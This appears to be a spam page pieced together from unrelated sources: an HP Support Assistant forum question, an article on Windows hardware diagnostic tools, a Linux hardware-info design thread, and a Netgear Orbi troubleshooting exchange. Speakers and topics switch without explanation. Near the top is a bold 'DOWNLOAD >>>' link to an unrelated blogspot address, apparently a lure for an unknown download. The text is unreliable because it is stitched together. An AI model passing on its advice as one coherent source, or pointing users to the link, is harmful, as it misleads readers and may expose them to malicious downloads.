I tried reinstalling and opted for the "Repair" previous instalation. After that was successfully completed, I still get the same quick window (with no diagnostics performed) asking if it fixed my problem.
 
Now my HP Support Assistant in the Troubleshooting & Fixes has a new "HP PC Hardware Diagostics". When I Click on it, I get a message stating "Diagnose and Check your system's Hardware Health". When I Click on that, I get a "Troubleshooter has been launched. Please follow the steps and provide feedback when done. It lists 3 options of my problem has been solved: YES ---- NO ---- DON'T KNOW
 
**DOWNLOAD >>> [https://kneedacexbrew.blogspot.com/?d=2A0Ph9](https://kneedacexbrew.blogspot.com/?d=2A0Ph9)**


 
PanamaSteve, don't click on**yes, no**, or **don't know**. Just wait while that screen is displayed until the app actually loads. It is slow to load because it has not been accessed before.
 
If you've ever opened up your computer, you know there is a lot of hardware in there, and it's all a potential point of failure. Certain pieces of hardware are more prone to failure than others, but nothing lasts forever.
 
Did you note that CPUs are at the bottom of the list? CPUs can die, but they'll often be the last PC part to do so, and it's often caused by another issue, like power problems, overheating, or otherwise. Of all your PC hardware components, the CPU is the least likely part to have an issue, especially if you install it and then leave it alone (occasional thermal paste reapplications aside).
 
But no matter the hardware, the best way to avoid being caught out is to perform regular hardware diagnostic tests on your computer, and there are many ways to run hardware tests on Windows 10 and 11.
 
That's the easiest way to use the Windows Performance Monitor, but if you want more data, you'll find live performance graphs in **Monitoring Tools > Performance Monitor** and customizable data sets in **Data Collector Sets > User Defined**.
 
There are lots of warning signs when your RAM is close to failing. They include worsening performance, frequent crashes, video cards failing to load on boot, corrupted data files, and incorrect RAM information in the Windows System app.
 
If you're wondering how to run a memory test on the RAM, you need to use the Windows Memory Diagnostic tool. It works by writing to, then reading, your computer's RAM. Differing values signal faulty hardware.

MemTest86+ is well-established as the best tool to test your RAM on Windows. It's more powerful than Microsoft's Windows Memory Diagnostic tool and is free and open source. Furthermore, unlike the Windows tool, MemTest86+ also has a full-featured graphical interface.
 
Memtest86+ uses two RAM testing algorithms and supports DDR5, DDR4, DDR3, and DDR2 RAM. You boot it directly from a USB flash drive or a CD, and Microsoft has signed the app's code for Secure Boot compatibility.
 
The app's key feature is the "Self-Monitoring, Analysis, and Reporting Technology" (SMART) test. It provides data about several aspects of your drives, including the read error rate, a count of reallocated sectors, the spin-up time, and a whole lot more.
 
CrystalDiskInfo also includes advanced power and audio management tools for hard drives and SSDs. You can also configure CrystalDiskInfo to provide live alerts if drives become too hot or suffer from other failures. You have to keep CrystalDiskInfo running in the background to receive temperature alerts, but it's really not a problem as it requires very little processing power or system memory.
 
HWiNFO is way ahead of the hardware testing pack regarding the amount of information provided. But once you get up to speed with its extensive range of data, you'll appreciate it as one of the best computer diagnostic test apps out there.
 
From a hardware test standpoint, we are most interested in the app's system health monitoring features. They provide detailed real-time reports and graphs about your machine's CPUs, GPUs, mainboards, drives, and peripherals. Double-click any of the sections in the left-hand panel to open a new window filled with data specific to that hardware.
 
We've written about several tools that'll help you test the health of your laptop battery, but the best option for Windows users is the built-in tool, **powercfg**. The powerful command generates a precise report on your battery status and history, showing you its capacity and more.
 
The first part of the battery report details your hardware, current battery status, total capacity, and current capacity, which is all great information. If you scroll down, you'll find more information on charging status, periods, and more.
 
Another way to diagnose faulty hardware on a Windows system is with a Linux Live CD or USB. There are several rescue and recovery disks for Windows, but two useful distros for diagnosing faulty Windows hardware are PartedMagic and the Ultimate Boot CD.
 
PartedMagic is a paid tool but features several useful tools for benchmarking and checking your hardware, not to mention its disk partitioning, closing, rescue, and erasing tools, whereas the Ultimate Boot CD is completely free and also features numerous Windows hardware checking tools, testing and analytics options, plus fixes for common issues. As of Ultimate Boot CD version 5, the rescue disk also includes a version of PartedMagic (for partitioning and managing hard drives), so it's a very handy tool to keep around.
 
I want to work on the design for this tool, but need some information to do so: specifically, what hardware information are we able to reliably show at the moment? I know there are a bunch of commands to show hardware information (lscpu, lspci, lsusb, etc): is the information shown there something we can reliably access?
 
Collating the firmware versions of devices (information from fwupd) with the actual devices (building a tree from the sysfs sources lspci/lsusb use) may be impossible since fwupd can represent virtual devices that might not show up on a traditional bus like PCIe, USB, Thunderbolt.
 
I think you should start by looking at what Hardinfo lists ( without the woefully outdated benchmark tests ).
Then look at CPU-Z for Windows and package all the stats that Hardinfo gives and package it as a Gnome-stastic version of CPU-Z.
 
I've been having ongoing problems for a little over a week with my RBK50 with two satellites after owning them for over a year and a half with no problems. I tried various firmware (including beta 2.2.0.66 and 2.0.x.x), factory rests (base and satellites), and various suggestions in the forms listing similar problems with the latest firmware, 2.1.4.16. I don't have a complicated setup. I use the satellites as wireless bridges for where running ethernet cable doesn't make sense. I use the wireless backhaul and also make MAC Address reservations via the built-in DHCP server. I use strong passwords for administration, main and guest Wi-Fi, but otherwise, I leave the defaults. I'm experiencing spontaneous reboots (3 minutes to several hours between reboots), Wi-Fi radios randomly turning themselves off (as shown in the admin web interface with nothing in the logs to explain), extremely slow wireless speed when within 5 feet of Orbi base (5GHz listed in Orbi admin web page; typically 5to 15% of normal), and randomly dropping all wireless and wired connections (required a power cycle). These problems are occurring even when I unplug the ethernet cable for the WAN port. Unfortunately, the logs are cleared on reboot and then have nothing useful.
 
What is the size of your home? Sq Ft? 
What is the distance between the router and satellite(s)? 30 feet is recommended in between them to begin with depending upon building materials.

What channels are you using? Auto? Try setting manual channel 1, 6 or 11 on 2.4Ghz and any unused channel on 5Ghz.
Any Wifi Neighbors near by? If so, how many? 

Try disabling the following and see:
MIMO, Daisy Chain, Fast Roaming, IPv6 and Set 20/40Mhz Coexistence to 40Mhz only. Save settings and reboot the router and satellite(s).
 
No modem. It's ethernet (Cat 5e) to my condo, which has fiber Internet to the building and Cat 5e cabling to each unit). Also, problems still exist without a network cable connected to the LAN port, therefore that's not the source of the problem.
 
On average I can see 30 wireless networks and occupational 40-50 wireless network. I live in a densely populated area of Seattle. This has been that way since before I purchased my Orbi and wasn't a problem for more than a year and a half.
 
Since I've performed all the troubleshooting you recommended and I saw in other forum posts, I highly suspect either a hardware problem or major firmware bug. That's why a wanted hardware diagnostics to help narrow down the problem. I'm thinking of purchasing a new system from Costco. If it works then recycle the old one and if it doesn't work then return to Costco.
 
The other problem is that you maybe in a wifi congested area. Having that many other wifi neighbors, the router maybe experiencing interferences. You can try this, lower the power out put of the radios from 100% to try 50% with the router alone. This will make the broadcast foot print smaller and help with nieghboring wifi...Try any channel 1, 6 or 11 and any on 5ghz. See if this might help. Let us know the results...
 
After trying all suggestions (including reducing the power put out by the radios), it was initially still rebooting numerous times per hour. The interval between spontaneous rebooting slowly increase over a few days and stabilized to about twice a day. Everything else appears to back to normal. This isn't ideal, but liveable for the time being. If this was a new product then I would have returned. Netgear does provide me any confidence with purchasing their products in the future.
 a2f82b0cb4
 
